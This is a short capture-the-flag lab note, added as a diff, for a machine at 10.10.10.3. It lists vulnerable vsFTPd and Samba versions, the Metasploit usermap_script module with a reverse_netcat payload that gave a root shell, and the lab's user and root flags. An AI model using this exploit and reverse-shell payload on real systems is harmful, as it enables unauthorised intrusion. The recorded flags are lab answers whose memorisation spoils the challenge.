@@ -1,0 +1,19 @@
+9/Nov/2022 - 10.10.10.3 (E)(W)
+
+Tools Used:
+Nmap, Metasploit, SearchSploit.
+
+Surface Level Vulnerabilities:
+21/tcp - vsFTPd 2.3.4 (Backdoor Command Execution, ..) (Tested : No)
+139,445/tcp - Samba 3.0.20 (Command Execution, ..) (Tested : Root Shell)
+
+Command Shell with Metasploit:
+exploit(multi/samba/usermap_script)
+payload(cmd/unix/reverse_netcat)
+
+Exploit Used:
+Username map script Command Execution (Samba 3.0.20)
+
+User Flag: e50100c2342cac35c9818bf6f0a7cdd2
+Root Flag: 19cd1361a1b1c4ca3f9d721adc69aa2e
+
